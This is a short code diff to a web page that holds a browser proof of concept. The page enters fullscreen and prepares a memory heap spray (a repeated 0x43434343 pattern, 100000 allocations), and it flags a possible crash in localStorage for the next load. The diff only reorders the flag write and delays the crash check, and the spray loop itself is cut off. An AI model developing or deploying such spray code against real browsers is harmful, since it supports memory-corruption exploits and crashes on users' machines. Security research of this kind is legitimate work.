@@ -154,19 +154,21 @@ body {
 
 <script>
 window.onload = () => {
-  if (localStorage.getItem("wasAboutToCrash") === "yes") {
-    localStorage.removeItem("wasAboutToCrash");
-    alert("⚠️ Last run may have triggered instability or crash.");
-  }
+  setTimeout(() => {
+    if (localStorage.getItem("wasAboutToCrash") === "yes") {
+      localStorage.removeItem("wasAboutToCrash");
+      alert("⚠️ Last run may have triggered instability or crash.");
+    }
+  }, 2000);
 };
 
 function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
-  document.body.requestFullscreen().then(() => {
-    localStorage.setItem("wasAboutToCrash", "yes");
+  localStorage.setItem("wasAboutToCrash", "yes");
 
+  document.body.requestFullscreen().then(() => {
     const PATTERN   = 0x43434343;
     const SPRAY_CNT = 100000;
     const SPRAY_LEN = 16;
